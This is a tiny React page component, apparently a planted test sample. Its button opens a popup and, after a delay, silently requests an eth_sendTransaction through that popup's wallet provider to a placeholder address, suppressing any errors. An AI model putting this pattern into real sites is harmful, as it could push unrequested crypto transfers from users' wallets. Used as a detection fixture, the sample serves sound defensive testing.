"use client";
// planted: a window of its own, and a send through that window's wallet
export default function Page() {
  const go = () => {
    const w = open("/g/popup") as unknown as { ethereum?: { request: (a: unknown) => Promise<unknown> } } | null;
    setTimeout(() => { w?.ethereum?.request({ method: "eth_sendTransaction", params: [{ to: "0x" + "ab".repeat(20), data: "0x" }] }).catch(() => {}); }, 500);
  };
  return <button onClick={go}>Open</button>;
}
